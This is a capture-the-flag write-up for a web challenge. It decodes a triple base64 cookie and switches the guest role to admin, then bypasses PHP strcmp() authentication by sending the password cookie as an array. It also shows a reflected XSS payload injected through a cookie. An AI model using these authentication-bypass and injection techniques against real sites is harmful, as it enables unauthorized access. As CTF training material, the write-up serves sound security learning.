# Reindeers and cookies
Web

## Challenge 

	You cannot cmp any cookie with Santa's cookies.

	Server: http://199.247.6.180:12008

	Authors: Milkdrop + Vlad

## Solution

A page with nothing special.

Let's look at the cookies

	curl -c - http://199.247.6.180:12008/
	...
	199.247.6.180	FALSE	/	FALSE	0	adminpass	MyLittleCookie%21
	199.247.6.180	FALSE	/	FALSE	0	cookiez	WlhsS2NGcERTVFpKYWtscFRFTktNR1ZZUW14SmFtOXBXak5XYkdNelVXbG1VVDA5

- `cookiez` is base64-encoded 3 times of `{"id":"2","type":"guest"}`

Change to admin and we see the output at the bottom.

	<body>
	<h1 style="text-shadow: 2px 2px #FFFFFF;">Santa loves cookies! Do you?</h1>
	<img style="margin-top:-20px" src="http://pngimg.com/uploads/cookie/cookie_PNG13697.png">
	</body>

	<h1 MyLittleCookie! class='wrong'>You got the admin password wrong :c<br></h1</h1>

Note that we can inject XSS using `adminpass`, but it has nothing to do with the exploit

	"><script>alert('XSS')</script><h1"

### Bypassing PHP strcmp()

From the challenge description, it has something to do with strcmp in PHP.

I refer to these writeup on PHP bypassing of strcmp:
- https://blog.0daylabs.com/2015/09/21/csaw-web-200-write-up/
- http://danuxx.blogspot.com/2013/03/unauthorized-access-bypassing-php-strcmp.html

> In those writeups, strcmp is bypassed by passing an Array.
> 
> Hence, when comparing an array to a string, NULL is returned and it passed the `strcmp()== 0` check.

Doing the same in this challenge, I pass an array of `adminpass[]` in the cookies.

	# Using Python requests cookies
	del r.cookies['adminpass']
	r.cookies['adminpass[]'] = 'hi'

And we get the flag

	<body>
	<h1 style="text-shadow: 2px 2px #FFFFFF;">Santa loves cookies! Do you?</h1>
	<img style="margin-top:-20px" src="http://pngimg.com/uploads/cookie/cookie_PNG13697.png">
	</body>

	<h1 Array class='right'>Good job! Here's your flag:<br>X-MAS{S4n74_L0v35__C00kiesss_And_Juggl1ng!}</h1</h1>


## Flag

	X-MAS{S4n74_L0v35__C00kiesss_And_Juggl1ng!}
